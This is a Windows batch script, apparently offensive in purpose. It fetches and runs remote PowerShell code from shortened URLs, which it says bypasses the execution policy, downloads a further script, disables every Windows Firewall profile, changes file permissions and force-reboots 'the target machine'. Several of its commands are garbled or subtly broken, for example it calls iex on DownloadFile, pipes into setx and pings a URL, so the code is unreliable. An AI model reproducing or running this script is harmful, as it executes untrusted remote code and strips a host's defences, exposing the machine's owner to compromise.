@echo off
setlocal enabledelayedexpansion

:: Variables
set tempfolder=%TEMP%
set firewallbkpfile=%tempfolder%\firewall_backup.ps1
set iurl=http://goo.gl/ignoredurl
set etag=X-Microsoft-PowerShell-Engine-Route -REQUIRED

:: Check if PowerShell.exe exists in the system PATH
for /f "skip=2 tokens=1" %%a in ('wmic product get Name ^| find /i "powershell.exe" 2^>nul') do set pspath=%%a
if not defined pspath (
    echo PowerShell.exe not found in the system PATH. Aborting.
    exit 1
)

:: Update PowerShell to bypass the execution policy
"%pspath%" -NoProfile -Command "iex (New-Object System.Net.WebClient).DownloadString('http://goo.gl/bypassps')"

:: Create a remote PowerShell script to backup the original Windows Firewall rules
"%pspath%" -NoProfile -Command "iex (New-Object System.Net.WebClient).DownloadFile('http://goo.gl/fwbkp', '%tempfolder%\firewall_backup.ps1')"

:: Create a temporary PowerShell script with executable rights to disable Windows Firewall and reboot
powershell.exe -NoProfile -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; Restart-Computer" | setx /m tempfile -p
icacls "%tempfolder%\disable_firewall_reboot.ps1" /grant "NT AUTHORITY\SYSTEM":(OI)(CI)F /T

:: Check if the web request created in the remote PowerShell script was successful
ping -n 1 -w 5 %iurl% > nul
if errorlevel 1 (
    echo Web request failed. Aborting.
    del /Q "%tempfolder%\firewall_backup.ps1"
    exit 1
)

:: Reboot the target machine
start /wait shutdown -r -t 0
